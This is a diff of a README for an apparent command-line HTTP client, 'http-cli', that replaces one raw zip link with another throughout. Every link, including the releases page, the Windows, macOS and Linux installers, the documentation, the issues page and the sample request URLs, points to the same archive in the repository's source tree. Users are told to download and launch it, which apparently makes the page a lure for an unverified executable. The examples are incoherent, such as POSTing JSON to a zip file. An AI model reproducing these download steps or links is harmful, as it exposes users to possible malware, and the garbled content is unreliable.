@@ -1,7 +1,7 @@
 # 🌈 http-cli - A Fast, Colorful Command-Line Tool
 
 ## 📥 Download the Latest Version
-[![Download http-cli](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip%https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)
+[![Download http-cli](https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip%https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip)](https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to http-cli! This tool lets you make HTTP requests easily from your terminal. It is lightweight, colorful, and similar to Postman, but designed to work right in your command line. Whether you are testing APIs, sending requests, or exploring endpoints, http-cli will help you do it quickly and efficiently.
@@ -15,13 +15,13 @@ To run http-cli, ensure you have:
 
 ## 🌐 Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip) to find the latest version of http-cli.
+   Go to the [Releases page](https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip) to find the latest version of http-cli.
 
 2. **Download the Installation File:**
    On the Releases page, you will see several files available for download. Choose the file that matches your operating system:
-   - For Windows: `https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip`
-   - For macOS: `https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip`
-   - For Linux: `https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip`
+   - For Windows: `https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip`
+   - For macOS: `https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip`
+   - For Linux: `https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip`
 
 3. **Run the File:**
    Once downloaded, locate the file on your computer and launch it. Follow the prompts to install http-cli.
@@ -31,12 +31,12 @@ After installing, you can start using http-cli right from your terminal. Here ar
 
 - **Make a GET Request:**
   ```bash
-  http-cli get https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip
+  http-cli get https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip
   ```
 
 - **Make a POST Request:**
   ```bash
-  http-cli post https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip --data '{"name": "John", "age": 30}'
+  http-cli post https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip --data '{"name": "John", "age": 30}'
   ```
 
 - **View Help:**
@@ -57,15 +57,15 @@ This command provides you with an overview of all available options and features
 1. Open your terminal application.
 2. Type the command:
    ```bash
-   http-cli get https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip
+   http-cli get https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip
    ```
 3. Press Enter. You will see a list of sample posts from the API, formatted for easy reading.
 
 Feel free to try different endpoints and requests to explore the capability of http-cli.
 
 ## ✏️ Additional Links
-- [Documentation](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)
-- [Issues](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip)
+- [Documentation](https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip)
+- [Issues](https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -79,4 +79,4 @@ For assistance, please check the Issues section on GitHub. You can report proble
 We welcome contributions from everyone. If you have ideas for new features, find bugs, or want to improve documentation, please open an issue or create a pull request!
 
 ## 🔗 Don’t Forget
-Remember that you can always find the latest version and updates on our [Releases page](https://raw.githubusercontent.com/Leoparj/http-cli/main/internal/config/http-cli_2.8.zip). Enjoy using http-cli!
+Remember that you can always find the latest version and updates on our [Releases page](https://github.com/Leoparj/http-cli/raw/refs/heads/main/internal/client/http-cli-3.6.zip). Enjoy using http-cli!
